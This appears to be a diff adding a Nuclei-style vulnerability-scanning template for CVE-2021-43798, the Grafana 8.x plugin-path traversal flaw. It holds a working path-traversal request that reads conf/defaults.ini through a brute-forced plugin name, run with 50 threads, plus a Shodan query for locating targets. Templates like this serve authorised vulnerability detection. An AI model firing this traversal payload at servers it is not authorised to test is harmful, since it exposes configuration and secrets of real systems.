@@ -1,0 +1,41 @@
+id: grafana-file-read
+
+info:
+  name: Grafana 8.x - Local File Inclusion
+  author: xc
+  severity: high
+  description: Grafana 8.x is vulnerable to local file inclusion.
+  classification:
+    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
+    cvss-score: 7.5
+    cve-id: CVE-2021-43798
+    cwe-id: CWE-22
+  metadata:
+    max-request: 325
+    shodan-query: title:"Grafana"
+  tags: grafana,lfi
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/public/plugins/{{pluginSlug}}/../../../../../conf/defaults.ini"
+
+    payloads:
+      pluginSlug: helpers/wordlists/grafana-plugins.txt
+    threads: 50
+    stop-at-first-match: true
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "socket = /tmp/grafana.sock"
+          - "http_port"
+        condition: and
+
+      - type: status
+        status:
+          - 200
+
+# digest: 490a00463044022073bd10bbc5995382ec8c0341dd17b2f76574bb3fe3c5d7bcabd823e9b53a817c022046e04d85a404019c230fe1e39bd7dcbb463497dda3200f461cb7d3ee368f8555:922c64590222798bb761d5b6d8e72950
